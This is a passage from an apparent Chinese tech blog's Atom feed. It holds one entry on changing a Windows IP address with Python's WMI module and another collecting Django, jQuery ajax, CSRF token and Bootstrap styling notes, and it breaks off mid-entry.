&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;s
    
    </summary>
    
      <category term="Web后端" scheme="http://flamepeak.com/categories/Web%E5%90%8E%E7%AB%AF/"/>
    
    
      <category term="Learning" scheme="http://flamepeak.com/tags/Learning/"/>
    
  </entry>
  
  <entry>
    <title>Python 修改ip地址</title>
    <link href="http://flamepeak.com/2020/08/28/Python-change-ip-address/"/>
    <id>http://flamepeak.com/2020/08/28/Python-change-ip-address/</id>
    <published>2020-08-28T03:07:36.000Z</published>
    <updated>2020-08-28T01:51:01.457Z</updated>
    
    <content type="html"><![CDATA[<p>在windows中使用python修改ip地址，需要<a href="https://pypi.org/project/WMI/#downloads" target="_blank" rel="noopener">WMI (Windows Management Instrumentation )模块</a>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install WMI</span><br></pre></td></tr></table></figure>
<p>设置指定的ip地址：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wmi</span><br><span class="line"></span><br><span class="line"><span class="comment"># Obtain network adaptors configurations</span></span><br><span class="line">nic_configs = wmi.WMI().Win32_NetworkAdapterConfiguration(IPEnabled=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># First network adaptor</span></span><br><span class="line">nic = nic_configs[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># IP address, subnetmask and gateway values should be unicode objects</span></span><br><span class="line">ip = <span class="string">u'192.168.0.11'</span></span><br><span class="line">subnetmask = <span class="string">u'255.255.255.0'</span></span><br><span class="line">gateway = <span class="string">u'192.168.0.1'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set IP address, subnetmask and default gateway</span></span><br><span class="line"><span class="comment"># Note: EnableStatic() and SetGateways() methods require *lists* of values to be passed</span></span><br><span class="line">nic.EnableStatic(IPAddress=[ip],SubnetMask=[subnetmask])</span><br><span class="line">nic.SetGateways(DefaultIPGateway=[gateway])</span><br></pre></td></tr></table></figure>
<p>修改为通过DHCP自动获取ip：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wmi</span><br><span class="line"></span><br><span class="line"><span class="comment"># Obtain network adaptors configurations</span></span><br><span class="line">nic_configs = wmi.WMI().Win32_NetworkAdapterConfiguration(IPEnabled=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># First network adaptor</span></span><br><span class="line">nic = nic_configs[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable DHCP</span></span><br><span class="line">nic.EnableDHCP()</span><br></pre></td></tr></table></figure>
<p>需要注意的是，在实际使用过程中，需要检查 <a href="http://msdn.microsoft.com/en-us/library/aa390383(v=VS.85).aspx" target="_blank" rel="noopener">EnableStatic()</a>, <a href="http://msdn.microsoft.com/en-us/library/aa393301(v=VS.85).aspx" target="_blank" rel="noopener">SetGateways()</a> and <a href="http://msdn.microsoft.com/en-us/library/aa390378(v=VS.85).aspx" target="_blank" rel="noopener">EnableDHCP()</a> 的返回值，'0' 代表成功, '1' 代表需要重启，其它值需要查看上面链接的说明。返回值的格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(0,)</span><br></pre></td></tr></table></figure>
<p>即，为python中tuple格式。</p>
<p>之上的方法在win7 python3.8中测试通过。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在windows中使用python修改ip地址，需要&lt;a href=&quot;https://pypi.org/project/WMI/#downloads&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;WMI (Windows Management Instru
    
    </summary>
    
      <category term="Python" scheme="http://flamepeak.com/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>Django 一些记录</title>
    <link href="http://flamepeak.com/2020/08/28/Python-Django-20200904/"/>
    <id>http://flamepeak.com/2020/08/28/Python-Django-20200904/</id>
    <published>2020-08-28T03:07:36.000Z</published>
    <updated>2020-09-07T09:33:14.688Z</updated>
    
    <content type="html"><![CDATA[<h3 id="添加本地js">添加本地js</h3>
<p>在Django应用下新建目录static（与templates同级目录），然后修改<code>settings.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">STATIC_URL = <span class="string">'/static/'</span></span><br><span class="line">STATICFILES_DIRS = (</span><br><span class="line">    os.path.join(BASE_DIR, <span class="string">'static'</span>),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>然后把自己的js、css目录放置到static目录下。</p>
<p>在html页面中设置本地js、css如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Bootstrap CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"./static/css/bootstrap.min.css"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./static/js/jquery-3.0.0.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./static/js/bootstrap.bundle.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>关于bootstrap的问题，简要提一下：</p>
<p>因为bootstrap需要jQuery，所以需要先引入jQuery，至于<code>propper.js</code>，<code>popper.min.js</code> 用于设置弹窗、提示、下拉菜单，是第三方插件，目前 <code>bootstrap.bundle.min.js</code> 已经包含了 <code>popper.min.js</code>，所以可以直接按照上面的写法。</p>
<h3 id="自定义时间格式">自定义时间格式</h3>
<p><strong>DateTimeField、DateField和TimeField</strong>，其值分别对应着Python里的datetime.datetime、datetime.date和datetime.time三个实例，这三个Field里都有两个参数：<strong>auto_now和auto_now_add，默认值均为False</strong>。</p>
<p><strong>auto_now参数说明：</strong></p>
<blockquote>
<p>每次保存对象时自动将字段值设置为当前时间，能够在保存该字段时,将其值设置为当前时间,并且每次修改model,都会自动更新。因此这个参数在需要存储“最后修改时间”的场景下,十分方便，常用类似“last-modified”或者"update_time"字段。</p>
</blockquote>
<p><a href="https://blog.51cto.com/xujpxm/2090382" target="_blank" rel="noopener">参考</a></p>
<p>如果默认时间格式是英文显示，那么可以修改<code>settings.py</code>进行自定义：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">USE_L10N = <span class="keyword">False</span></span><br><span class="line">DATE_FORMAT = <span class="string">'Y-m-d'</span></span><br><span class="line">DATETIME_FORMAT = <span class="string">'Y-m-d H:i:s'</span></span><br></pre></td></tr></table></figure>
<p><strong>注意事项：如果USE_L10N设置为了True，那么语言环境规定的格式具有更高的优先级并将被应用，即DATE_FORMAT不生效。</strong></p>
<h3 id="list-group-设置固定宽度">list-group 设置固定宽度</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% for itm in item2FA_list %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list-group list-group-horizontal"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span> <span class="attr">style</span>=<span class="string">"width: 18rem"</span>&gt;</span> &#123;&#123; itm.website_text &#125;&#125; <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span> <span class="attr">style</span>=<span class="string">"width: 28rem"</span>&gt;</span> &#123;&#123; itm.account_text &#125;&#125; <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span> <span class="attr">style</span>=<span class="string">"width: 28rem"</span>&gt;</span> &#123;&#123; itm.pub_date &#125;&#125; <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="django-开启sslhttps">Django 开启SSL（HTTPS）</h3>
<p>Django development server (run by <code>python manage.py runserver</code>) <strong><em>cannot handle https</em></strong>.</p>
<p>One of simplest solutions from the answer is to use <a href="https://github.com/teddziuba/django-sslserver" target="_blank" rel="noopener">django-sslserver</a> package.</p>
<p>Other solutions include running some kind of https proxy locally.</p>
<p>Or, run it not in development mode (no live reload) using wsgi server and configuring proper https on it.</p>
<p><a href="https://stackoverflow.com/questions/57849833/how-to-make-django-site-https-in-windows10" target="_blank" rel="noopener">https://stackoverflow.com/questions/57849833/how-to-make-django-site-https-in-windows10</a></p>
<h3 id="html中value含有空格被截断">html中value含有空格被截断</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"&#123;% url 'update2FA' %&#125;"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"update_btn"</span> <span class="attr">value</span>=<span class="string">&#123;&#123;</span> <span class="attr">source_key_text</span> &#125;&#125; &gt;</span>更新<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>现在<code>source_key_text</code>的值为<code>aaaa bbbb cccc dddd</code>，在POST传入时，只传入了aaaa，后面的被截断。正确的写法为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"&#123;% url 'update2FA' %&#125;"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"update_btn"</span> <span class="attr">value</span>=<span class="string">'&#123;&#123; source_key_text &#125;&#125;'</span> &gt;</span>更新<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>html的标签属性是按照空格来区分的，如果不加引号会识别出错。</p>
<p>具体可以参考: <a href="https://axiu.me/coding/value-has-spaces-breaks-in-html/" target="_blank" rel="noopener">参考</a></p>
<h3 id="前端往后端提交数据-3种方法">前端往后端提交数据( 3种方法)</h3>
<h4 id="html原生表单">1. <strong>HTML原生表单</strong></h4>
html原生就带表单
<form>
标签，
<form>
<p>标签提供设置method，可以使用get/post方法提交数据到后端，而如果加上action，则可以将数据指定提交到特定的url（即对应的后端函数）。对应submit按钮，需要将type="submit"，而不能是普通的type="button"。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; action=&quot;/mopasswd/&quot;&gt;</span><br><span class="line">......</span><br><span class="line">&lt;button type=&quot;submit&quot;&gt;submit&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<h4 id="jquery的.post">2 . jquery的<code>.post</code></h4>
<p>jquery的<code>.post</code>请求格式如下：<code>.post</code>是高层的操作，jQuery会自动封装调用底层的<code>$.ajax</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.post(url,&#123;json格式的数据&#125;,function (条件) &#123;</span><br><span class="line">           具体业务函数</span><br><span class="line">    &#125;,&apos;返回的数据格式&apos;)</span><br></pre></td></tr></table></figure>
<p>一般示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.post(&apos;/changepassword/&apos;,&#123;</span><br><span class="line">    &apos;username&apos;:$(&apos;#username&apos;).val(),</span><br><span class="line">    &apos;password&apos;:$(&apos;#password&apos;).val(),</span><br><span class="line">    &#125;,function (res) &#123;</span><br><span class="line">            alert(&quot;添加成功！&quot;);</span><br><span class="line">            window.location.reload();</span><br><span class="line">    &#125;,&apos;json&apos;)</span><br></pre></td></tr></table></figure>
<h4 id="jquery的.ajax">3. jquery的<code>.ajax</code></h4>
<p>ajax是jquery另外一种向后台推送数据的方法，格式如下：<code>$.ajax</code>是一种通用的底层封装，<code>$.ajax()</code>请求数据之后，则需要使用回调函数，有beforeSend、error、dataFilter、success、complete等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.ajax(</span><br><span class="line">&#123;</span><br><span class="line">    url:url,</span><br><span class="line">    type:&quot;post&quot;,</span><br><span class="line">    data:&#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    beforeSend:function()&#123;&#125;,</span><br><span class="line">    async:true,</span><br><span class="line">    success:function()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    error:function()&#123;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.ajax(</span><br><span class="line">&#123;</span><br><span class="line">    url:&apos;/changepassword/&apos;,</span><br><span class="line">    type:&quot;post&quot;,</span><br><span class="line">    data:&#123;</span><br><span class="line">        &apos;username&apos;:$(&apos;#username&apos;).val(),</span><br><span class="line">        &apos;password&apos;:$(&apos;#password&apos;).val(),</span><br><span class="line">    &#125;,</span><br><span class="line">    beforeSend:function()&#123;&#125;,</span><br><span class="line">    async:true,</span><br><span class="line">    success:function(res)&#123;</span><br><span class="line">        alert(&quot;添加成功！&quot;);</span><br><span class="line">        window.location.reload();</span><br><span class="line">    &#125;,</span><br><span class="line">    error:function()&#123;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="后端往前端返回数据"><strong>后端往前端返回数据</strong></h3>
<p>后端往前端返回数据有各种render，render_to_response，JsonResponse等，看似不同，其实都是差不多的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#render只能返回静态页面</span><br><span class="line">render(request,&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line">#render_to_response可以返回页面与同时向前端返回数据</span><br><span class="line">#locals()表示会把函数内所有的变量数据都会以json格式返回到前端</span><br><span class="line">render_to_response（&apos;index.html&apos;,locals()）</span><br><span class="line">#或者可以按照json格式，指定返回给前端的变量与数值</span><br><span class="line">render_to_response(&apos;index.html&apos;, &#123;&apos;userinfo&apos;:userinfo&#125;)</span><br><span class="line"></span><br><span class="line">#JsonResponse不返回页面，仅以json格式向前端返回数据</span><br><span class="line">JsonResponse(&#123;&apos;result&apos;: result&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="前端接收后端数据并展示">前端接收后端数据并展示</h3>
<p>####　1．使用python的mako语法</p>
<p>第一种方式就是使用python的mako语法，就是前面用表格遍历数据库查询结果，并且展示的语法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for i in data %&#125;</span><br><span class="line">    &#123;&#123; i.xxx &#125;&#125;</span><br><span class="line">    ......</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>这种用法好处是简单，易学易用易懂。缺点是只能在页面第一次加载的时候加载数据，页面不刷新/重新加载，无法修改数据。</p>
<h4 id="使用javascriptjquery">2. 使用javascript/jquery</h4>
<p>第二种方式是使用<code>javascript/jquery</code>，控制/修改变量的<code>value</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#在form里面以&lt;h1&gt;标题格式，显示“这是一段文字”</span><br><span class="line">var str = &quot;&lt;h1&gt;这是一段文字&lt;/h1&gt;&quot;</span><br><span class="line">$(&apos;.form&apos;).html(str)</span><br><span class="line"></span><br><span class="line">#将id为&quot;button1&quot;的按钮的文字显示设置为“修改”</span><br><span class="line">$(&apos;#button1&apos;).text(&apos;修改&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="section"></h3>
<h3 id="ajax-post请求forbidden-csrf-token-missing-or-incorrect.错误">ajax Post请求Forbidden (CSRF token missing or incorrect.)错误</h3>
<p>需要在请求中加入<code>csrfmiddlewaretoken:''</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">'#update_btn'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">'/update2FA'</span>,</span><br><span class="line">        type:<span class="string">'post'</span>,</span><br><span class="line">        data:&#123;<span class="string">'source_key_text'</span>: $(<span class="string">'#update_btn'</span>).val(),</span><br><span class="line">              csrfmiddlewaretoken:<span class="string">'&#123;&#123; csrf_token  &#125;&#125;'</span>&#125;,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">            $(<span class="string">'#secret_val'</span>).val(data)&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="django中model的主键的设置与自增">django中model的主键的设置与自增</h3>
<p>在django所定义的model里是可以自己设置主键的，具体方法为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AgentInfo_id = models.IntegerField(primary_key=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
<p>但是要注意的是，为了添加元素的过程中主键的自增，主键的设置中不能加入default属性，否则save()的过程将不再是新建元素而是替换元素。</p>
<p>google 的一个group中说不要用IntegerField 用AutoField.</p>
<p>使用AutoField在管理界面输入数据时，不会显示此项。而IntegerField会显示此项。</p>
<h3 id="ajax-uncaught-referenceerror-is-not-defined">ajax Uncaught ReferenceError: $ is not defined</h3>
<p>代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script rel=<span class="string">"javascript"</span> type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    $(<span class="string">'#update_btn&#123;&#123;itm.account_id&#125;&#125;'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">'/update2FA'</span>,</span><br><span class="line">        type:<span class="string">'post'</span>,</span><br><span class="line">        data:&#123;<span class="string">'source_key_text'</span>: $(<span class="string">'#update_btn&#123;&#123;itm.account_id&#125;&#125;'</span>).val(),</span><br><span class="line">              csrfmiddlewaretoken:<span class="string">'&#123;&#123; csrf_token  &#125;&#125;'</span>&#125;,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">            $(<span class="string">'#totp_val&#123;&#123;itm.account_id&#125;&#125;'</span>).val(data)&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码上没什么错误，从同一个文件其它地方复制过来的。</p>
<p>错误的原因是，jQuery没有在此之前引入，需要把</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Bootstrap CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"./static/css/bootstrap.min.css"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Optional JavaScript --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./static/js/jquery-3.0.0.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./static/js/bootstrap.bundle.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>写在ajax代码的前面，否则识别会出错。</p>
<h3 id="button按钮文字修改valtext区别">button按钮文字修改val、text区别</h3>
<p>例如：button按钮代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span>  <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"totp_val&#123;&#123;itm.account_id&#125;&#125;"</span> <span class="attr">value</span>=<span class="string">"123456"</span>&gt;</span> 000000 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如下ajax代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">'#update_btn&#123;&#123;itm.account_id&#125;&#125;'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">'/update2FA'</span>,</span><br><span class="line">        type:<span class="string">'post'</span>,</span><br><span class="line">        data:&#123;<span class="string">'account_id'</span>: $(<span class="string">'#update_btn&#123;&#123;itm.account_id&#125;&#125;'</span>).val(),</span><br><span class="line">              csrfmiddlewaretoken:<span class="string">'&#123;&#123; csrf_token  &#125;&#125;'</span>&#125;,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">            $(<span class="string">'#totp_val&#123;&#123;itm.account_id&#125;&#125;'</span>).val(data)&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>倒数第四行如果是val，那么修改的是button中value属性的值，即123456的值；</p>
<p>倒数第四行如果是text，那么修改的是button中显示文本的值，即000000的值。</p>
<h3 id="ajax返回json数据例子">Ajax返回Json数据例子</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">'ajaxfile.php'</span>,</span><br><span class="line">        type: <span class="string">'get'</span>,</span><br><span class="line">        dataType: <span class="string">'JSON'</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> len = response.length;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> id = response[i].id;</span><br><span class="line">                <span class="keyword">var</span> username = response[i].username;</span><br><span class="line">                <span class="keyword">var</span> name = response[i].name;</span><br><span class="line">                <span class="keyword">var</span> email = response[i].email;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> tr_str = <span class="string">"&lt;tr&gt;"</span> +</span><br><span class="line">                    <span class="string">"&lt;td align='center'&gt;"</span> + (i+<span class="number">1</span>) + <span class="string">"&lt;/td&gt;"</span> +</span><br><span class="line">                    <span class="string">"&lt;td align='center'&gt;"</span> + username + <span class="string">"&lt;/td&gt;"</span> +</span><br><span class="line">                    <span class="string">"&lt;td align='center'&gt;"</span> + name + <span class="string">"&lt;/td&gt;"</span> +</span><br><span class="line">                    <span class="string">"&lt;td align='center'&gt;"</span> + email + <span class="string">"&lt;/td&gt;"</span> +</span><br><span class="line">                    <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line"></span><br><span class="line">                $(<span class="string">"#userTable tbody"</span>).append(tr_str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>下面是我自己的例子，注意，如果格式解析不正确那么就需要下面的方法，格式化json数据：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">'#update_btn&#123;&#123;itm.account_id&#125;&#125;'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">'/update2FA'</span>,</span><br><span class="line">        type:<span class="string">'post'</span>,</span><br><span class="line">        data:&#123;<span class="string">'account_id'</span>: $(<span class="string">'#update_btn&#123;&#123;itm.account_id&#125;&#125;'</span>).val(),</span><br><span class="line">              csrfmiddlewaretoken:<span class="string">'&#123;&#123; csrf_token  &#125;&#125;'</span></span><br><span class="line">             &#125;,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span>(<span class="params">resp</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> objData = jQuery.parseJSON(resp);</span><br><span class="line">            $(<span class="string">'#totp_val&#123;&#123;itm.account_id&#125;&#125;'</span>).text(objData.totp_val);</span><br><span class="line">            $(<span class="string">'#update_btn&#123;&#123;itm.account_id&#125;&#125;'</span>).text(objData.time_remain);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="bootstrap-圆形样式设置">bootstrap 圆形样式设置</h3>
<p><a href="https://www.geeksforgeeks.org/how-to-get-circular-buttons-in-bootstrap-4/" target="_blank" rel="noopener">参考: How to get circular buttons in bootstrap 4</a></p>
<p><a href="https://www.cnblogs.com/an2333/p/11520832.html" target="_blank" rel="noopener">CSS样式-border-radius圆形边框基本用法</a></p>
<p>关键设置是<code>border-radius</code>，如果将值设为50%，则实现正圆形。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"><span class="selector-class">.btn-circle</span><span class="selector-class">.btn-sm</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">6px</span> <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.btn-circle</span><span class="selector-class">.btn-md</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">7px</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.btn-circle</span><span class="selector-class">.btn-xl</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">70px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">70px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">35px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
<p>html:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span>  <span class="attr">class</span>=<span class="string">"btn btn-danger btn-circle btn-sm"</span>&gt;</span> 30 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="ajax-实现倒计时">Ajax 实现倒计时</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> count = <span class="number">30</span>;</span><br><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    count--;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// update timer here</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count === <span class="number">0</span>) &#123;</span><br><span class="line">        count = <span class="number">30</span>;</span><br><span class="line">        <span class="comment">// ajax code here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p><a href="https://stackoverflow.com/questions/21022634/run-ajax-every-30-seconds-and-show-a-countdown-timer" target="_blank" rel="noopener">参考：Run ajax every 30 seconds and show a countdown timer</a></p>
<p>修改后代码：</p>
